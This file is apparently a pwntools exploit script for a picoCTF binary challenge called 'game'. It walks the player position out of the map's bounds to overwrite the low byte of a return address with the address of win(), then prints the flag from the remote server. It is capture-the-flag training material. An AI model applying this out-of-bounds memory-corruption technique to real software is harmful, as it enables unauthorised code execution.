#!/usr/bin/env python3

from pwn import *

exe = ELF("./game")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG: 
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 51300)

    return r


def main():
    r = conn()

    # Extract the LSByte of the address of win
    overwrite_val = bytes([p64(exe.symbols.win)[0]])

    # Newline is \n
    if args.LOCAL: 

        # Set player_tile to overwrite_val
        r.sendlineafter(b'X\n', b'l'+overwrite_val)
        print(r.recvuntil(b'End tile position:'))
        print(r.recvuntil(b'End tile position:'))

        # MOVE TO [ebp-0xabc]: row -1 and column 51
        # MOVE COLUMN WISE BEFORE MOVING ROW WISE
        # Initial player position: (4,4) => (row,col)
        for i in range(47): 
            r.sendlineafter(b'X\n', b'd')
   
            # Map is printed twice due to \n being accepted by getchar() although
            # that falls through move_player without doing anything
            print(r.recvuntil(b'End tile position:'))
            print(r.recvuntil(b'End tile position:'))
    
        # Current player position: (4,51)
        
        for i in range(5):
            r.sendlineafter(b'X\n', b'w')

            # If row == -1, then the map will not be printed because move_player will return
            # and execute win()
            if i != 4: 
                print(r.recvuntil(b'End tile position:'))
                print(r.recvuntil(b'End tile position:'))

        print(r.recvuntil(b'G'))

    # Newline is \r\n
    else: 

        # Set player_tile to overwrite_val
        r.sendlineafter(b'X\r\n', b'l'+overwrite_val)
        print(r.recvuntil(b'End tile position:'))
        print(r.recvuntil(b'End tile position:'))

        # MOVE TO [ebp-0xabc]: row -1 and column 51
        # MOVE COLUMN WISE BEFORE MOVING ROW WISE
        # Initial player position: (4,4) => (row,col)
        for i in range(47): 
            r.sendlineafter(b'X\r\n', b'd')
   
            # Map is printed twice due to \n being accepted by getchar() although
            # that falls through move_player without doing anything
            print(r.recvuntil(b'End tile position:'))
            print(r.recvuntil(b'End tile position:'))
    
        # Current player position: (4,51)
        
        for i in range(5):
            r.sendlineafter(b'X\r\n', b'w')

            # If row == -1, then the map will not be printed because move_player will return
            # and execute win()
            if i != 4: 
                print(r.recvuntil(b'End tile position:'))
                print(r.recvuntil(b'End tile position:'))

        print(r.recvuntil(b'}'))


if __name__ == "__main__":
    main()
